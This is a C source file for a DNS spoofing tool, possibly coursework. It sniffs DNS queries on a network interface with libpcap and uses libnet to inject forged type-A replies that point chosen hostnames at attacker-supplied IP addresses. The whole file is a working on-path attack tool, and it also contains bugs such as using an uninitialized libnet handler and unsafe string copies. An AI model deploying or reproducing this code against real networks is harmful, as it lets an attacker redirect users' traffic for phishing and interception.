#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <libnet.h>
#include <resolv.h>
#include <stdint.h>
#include <unistd.h>


#include "dnsheader.h"

//#define LOG
//#define DEBUG

// global variables
int forgedHostNames = 0; // number of hostNames in the hostNames file
char ips[MAX_FORGED_HOSTNAMES][IP_MAX_LENGTH]; // spoofed/fake IPs in the hostNames file
char hostNames[MAX_FORGED_HOSTNAMES][MAX_HOSTNAME_LENGTH]; // hostnames to be mapped to spoofed/fake IPs
char *interface = NULL; // interface to be captured



//supportive functions

// if we have "-h" option, this function reads the file and fills the two arrays ips and hostNames (global variables)
void readHostNamesFile(char *hostNamesFile) {
    
    FILE *filePtr = fopen(hostNamesFile, "r");
    if (filePtr == NULL) {
        fprintf(stderr, "readHostNamesFile::Error in opening the hostNames file !!!\n");
        forgedHostNames = -1;
        return;
    }
    
    forgedHostNames = 0;
    while (!feof(filePtr)) {
        fscanf(filePtr, "%s", ips[forgedHostNames]);
        fscanf(filePtr, "%s", hostNames[forgedHostNames]);
        
        // adding "www." at the beginning of the hostName in case, it doesn't have
        if (strncmp(hostNames[forgedHostNames], "www", 3) != 0) {
            char tempHostName[MAX_HOSTNAME_LENGTH];
            strncpy(tempHostName, "www.", 4);
            strcpy(tempHostName + 4, hostNames[forgedHostNames]);
            strcpy(hostNames[forgedHostNames], tempHostName);
        }
        
        (forgedHostNames)++;
    }
#ifdef DEBUG
    printf("forgedHostNames = %d\n", forgedHostNames);
#endif
    return;
}




// This function gets called for each and every packet received. We will filter the packets which are not (udp && port == 53). For those packets which are dns-query, we will see whether:
//    - it is a query type A
//    - It's host name is inside the file
//    If the two conditions are valid, a spoofed reply will be forged to the network
void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ip *ip; // for IP header
    ip = (struct ip *) (packet + SIZE_ETHERNET);
    
    struct udphdr *udp; // for UDP header
    struct dnshdr *dns; // for DNS header
    char *dnsPayload; // pointer to DNS payload part of the packet
    char hostName[MAX_HOSTNAME_LENGTH];
    char ip_address[IP_MAX_LENGTH];
    libnet_t *handler;    /* Libnet handler */
    char errbuf_libnet[LIBNET_ERRBUF_SIZE];
    
    
    
    if (ip->ip_p != IPPROTO_UDP) {
#ifdef DEBUG
        // printf("process_packet::Debug::The packet is not of type UDP. So, it is ignored.\n");
#endif
        return;
    }
    
    
    udp = (struct udphdr *) (packet + SIZE_ETHERNET + LIBNET_IPV4_H);
    if (ntohs(udp->dest) != 53) {
#ifdef DEBUG
        // printf("process_packet::Debug::The packet is of type UDP. However, it's port is not 53 (it is %d). So, it is ignored.\n", udp->dest);
#endif
        return;
    }
    
    
    dns = (struct dnshdr *) (packet + SIZE_ETHERNET + LIBNET_IPV4_H + LIBNET_UDP_H);
    
    dnsPayload = (char *) (packet + SIZE_ETHERNET + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);
    int dnsPayloadSize = strlen(dnsPayload);
    char *dnsPayload_bckup = dnsPayload;
    memset(hostName, '\0', sizeof(hostName));
    
    if (dn_expand((u_char *)dns, packet + (int)(header->caplen), dnsPayload, hostName, sizeof(hostName)) < 0) {    //expands the compressed domain name comp_dn to a full domain name
        fprintf(stderr, "Error::process_packet couldn't expand the compressed domain name.\n");
        return;
    }
    
    dnsPayload = dnsPayload_bckup;
    hostName[dnsPayloadSize-1]='\0';
    
    fprintf(stderr, "process_packet::DNS request detected (from %s:%d -> %s:%d), asking for %s.\n", inet_ntoa(ip->ip_src), ntohs(udp->source), inet_ntoa(ip->ip_dst), ntohs(udp->dest), hostName);
    
#ifdef DEBUG
    printf("process_packet::Debug::DNS request detected (from %s:%d -> %s:%d), asking for %s.\n", inet_ntoa(ip->ip_src), ntohs(udp->source), inet_ntoa(ip->ip_dst), ntohs(udp->dest), hostName);
#endif
    
    if (((int)*(dnsPayload+dnsPayloadSize+2)) != T_A) {
        fprintf(stderr, "process_packet::DNS Query is not type A. So, it is ignored.\n");
#ifdef DEBUG
        printf("process_packet::Debug:: DNS Query is not type A. So, it is ignored.\n");
#endif
        return ;
    }
    
    
    // adding "www." to the beginning of the host name in case it doesn't have it
    char tempHostName[MAX_HOSTNAME_LENGTH];
    if (strncmp(hostName, "www", 3) != 0) { // it doesn't have www at the beginning
        memset(tempHostName, '\0', sizeof(tempHostName));
        strncpy(tempHostName, "www.", 4);
        strncpy(tempHostName + 4, hostName, sizeof(hostName));
        strncpy(hostName, tempHostName, sizeof(tempHostName));
        
    }
    
#ifdef DEBUG
    printf("process_packet::Debug::the hostName is %s.\n", hostName);
#endif
    
    int index;
    if (forgedHostNames > 0) { // we have list of hostNames to be forged with spoofed dns reply
        for (index = 0; index < forgedHostNames; index++) {
            if (strcmp(hostNames[index], tempHostName) == 0) {
                break;
            }
        }
        
        if (index == forgedHostNames) {
            fprintf(stderr, "process_packet::The hostName (%s) is not among the hostNames specified in the file. So, it is ignored.\n", tempHostName);
            return;
        }
    }
    
    
    if (forgedHostNames == 0) {
        
        int fd;
        struct ifreq ifr;
        
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        
        /* I want to get an IPv4 IP address */
        ifr.ifr_addr.sa_family = AF_INET;
        
        /* I want IP address attached to the determined interface */
        strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
        
        ioctl(fd, SIOCGIFADDR, &ifr);
        close(fd);
        
        strcpy(ip_address, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    }
    else {
        strcpy(ip_address, ips[index]);
    }
    
#ifdef DEBUG
    printf("process_packet::Debug::The spoofed IP is %s.\n", ip_address);
#endif
    
    
    
    // Now, it is time to forge the spoofed packet towards the source of query
    /* getting the address in network order */
    u_long rData = libnet_name2addr4(handler, ip_address, LIBNET_DONT_RESOLVE);
    if (rData == -1) {
        fprintf(stderr, "Erorr::process_packet resolving name failed: %s.\n", libnet_geterror(handler));
        return;
    }
    
    // Making the spoofed DNS Response
    u_char response_payload[512];
    // +5 to include the Type and class field !!
    memcpy(response_payload, dnsPayload, dnsPayloadSize + 5);
    memcpy(response_payload + dnsPayloadSize + 5,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
    *((u_long *)(response_payload + dnsPayloadSize+17)) = rData;
    int dnsResponsePayloadSize = dnsPayloadSize + 21;
    int packetSize = LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H + dnsResponsePayloadSize;
    
    
    handler = libnet_init(LIBNET_RAW4, interface, errbuf_libnet);
    if (handler == NULL) {
        fprintf(stderr, "Erorr::process_packet Libnet_init failed: %s.\n", errbuf_libnet);
    }
    
    libnet_ptag_t dns_tag = 0;
    dns_tag = libnet_build_dnsv4(LIBNET_DNS_H, ntohs((short) dns->id),0x8580, 1, 1, 0, 0, response_payload, dnsResponsePayloadSize, handler, dns_tag);
    
    if (dns_tag == -1) {
        fprintf(stderr, "Erorr::process_packet Building DNS header failed: %s.\n", libnet_geterror(handler));
        return;
    }
    
    libnet_ptag_t udp_tag = 0;
    udp_tag = libnet_build_udp(ntohs((u_short) udp->dest), ntohs((u_short) udp->source), packetSize - LIBNET_IPV4_H, 0, NULL, 0, handler, udp_tag);
    
    if (udp_tag ==-1) {
        fprintf(stderr, "Erorr::process_packet Building UDP header failed: %s\n", libnet_geterror(handler));
        return;
    }
    
    libnet_ptag_t ip_tag = 0;
    ip_tag = libnet_build_ipv4(packetSize, 0, 8964, 0, 64, IPPROTO_UDP, 0, (u_long) ip->ip_dst.s_addr, (u_long) ip->ip_src.s_addr, NULL, 0, handler, ip_tag);
    
    if (ip_tag == -1) {
        fprintf(stderr, "Erorr::process_packet Building IP header failed: %s\n", libnet_geterror(handler));
        return;
    }
    
    int inject_size = libnet_write(handler);
    if (inject_size == -1) {
        fprintf(stderr, "Erorr::process_packet Write failed: %s\n", libnet_geterror(handler));
        return;
    }
    
    
    fprintf(stderr, "process_packet::Spoofed DNS response injected for the following DNS-request:\n\t(from %s:%d -> %s:%d), asking for hostName = %s, the fake IP address is %s.\n",inet_ntoa(ip->ip_src), ntohs(udp->source), inet_ntoa(ip->ip_dst), ntohs(udp->dest), hostName, ip_address);
    
#ifdef LOG
    printf("process_packet::Log::Spoofed DNS response injected for the following DNS-request:\n\t(from %s:%d -> %s:%d), asking for hostName = %s, the fake IP address is %s.\n",inet_ntoa(ip->ip_src), ntohs(udp->source), inet_ntoa(ip->ip_dst), ntohs(udp->dest), hostName, ip_address);
#endif
    
    libnet_destroy(handler);
    
}



/*=======================Main method======================*/

int main(int argc, char **argv) {
    int iFlag = 0;
    int hFlag = 0;
    char *hostNamesFile = NULL;
    char *BPFExpression = NULL;
    
    char dashI[] = "-i";
    char dashH[] = "-h";
    
    char errbuf[PCAP_ERRBUF_SIZE];      /* error buffer */
    pcap_t *handle;             /* packet capture handle */
    
    bpf_u_int32 mask;           /* subnet mask */
    bpf_u_int32 net;            /* ip */
    struct bpf_program fp;          /* compiled filter program (expression) */
    
    
    //--------------------------------Handling the program aguments--------------------------------
    int counter = 1;
    
    for (counter = 1; counter < argc; counter++) {
    if (strcmp(dashI, argv[counter]) == 0) {  //populate -i value
        iFlag = 1;
        //counter++;
        interface = argv[counter+1];
        counter++;
    }
    else if (strcmp(dashH, argv[counter]) == 0) {  //populate -h value
        hFlag = 1;
        //counter++;
        hostNamesFile = argv[counter+1];
        counter++;
    }
    
    else {   //populate bpf expression filter ex: BPFExpression = "udp dst port 53";
        int temp = counter;
        int bpfExpressionCounter = 0;
        while (temp < counter+1) {
            bpfExpressionCounter += (strlen(argv[temp])) + 1;
            temp++;
        }
        temp = counter;
        bpfExpressionCounter--;
        
        BPFExpression = (char *) malloc(bpfExpressionCounter * sizeof(char));
        int c = 0;
        while (temp < counter+1) {
            int c2;
            for (c2 = 0; c2 < strlen(argv[counter]); c2++) {
                BPFExpression[c++] = (argv[counter])[c2];
            }
            BPFExpression[c++] = ' ';
            temp++;
        }
        BPFExpression[--c] = '\0';
    }
    }
    
    
    fprintf(stderr, "DNS Inject Started::Interface Flag = %d, interface = %s, Hostnames Flag = %d, hostNamesFile = %s, BPFExpression = %s.\n\n\n", iFlag, interface, hFlag, hostNamesFile, BPFExpression);
    
#ifdef DEBUG
    printf("Debug::Interface Flag = %d, interface = %s, Hostnames Flag = %d, hostNamesFile = %s, BPFExpression = %s.\n",
           iFlag, interface, hFlag, hostNamesFile, BPFExpression);
#endif
    
    
    
    if (iFlag != 1) { // reading packets live from the default interface
        interface = pcap_lookupdev(errbuf);
        if (interface == NULL) {
            fprintf(stderr, "Error::Couldn't find default device: %s\n", errbuf);
            exit(EXIT_FAILURE);
        }
        
#ifdef DEBUG
        printf("Debug::default interface is %s\n", interface);
#endif
    }
    
    if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Error::Couldn't get netmask for device %s: %s\n", interface, errbuf);
        net = 0;
        mask = 0;
        exit(EXIT_FAILURE);
    }
    
#ifdef DEBUG
    printf("Debug::Interface: %s\n", interface);
#endif

    
    
    /*packet capture handle to look at packets on the network.*/
    handle = pcap_open_live(interface, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Error::Couldn't open device %s: %s\n", interface, errbuf);
        exit(EXIT_FAILURE);
    }
    
    /* make sure we're capturing on an Ethernet interface */
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Error::%s is not an Ethernet\n", interface);
        exit(EXIT_FAILURE);
    }
    
    
    //--------------------------------apply the BPF filter expression--------------------------------
    if (BPFExpression != NULL) {
        /* compile the filter expression */
        if (pcap_compile(handle, &fp, BPFExpression, 0, net) == -1) {
            fprintf(stderr, "Error::Couldn't parse filter %s: %s\n", BPFExpression, pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }
        
        /* apply the compiled filter */
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "Error::Couldn't install filter %s: %s\n", BPFExpression, pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }
    }
    
    
    //--------------------------------Read from hostFile--------------------------------
    if (hFlag) {
        readHostNamesFile(hostNamesFile);
        if (forgedHostNames == -1) {
            fprintf(stderr, "Error::Couldn't read the hostNames file !!\n");
            exit(EXIT_FAILURE);
        }
        
#ifdef DEBUG
        int i;
        for (i = 0; i < forgedHostNames; i++) {
            printf("Debug::[%s --> %s]\n", hostNames[i], ips[i]);
        }
#endif
    }
    
    
    //--------------------------------process packets--------------------------------
    pcap_loop(handle, 0, process_packet, NULL);
    
    /* cleanup */
    if (BPFExpression != NULL) {
        pcap_freecode(&fp);
    }
    
    pcap_close(handle);
    return 0;
}

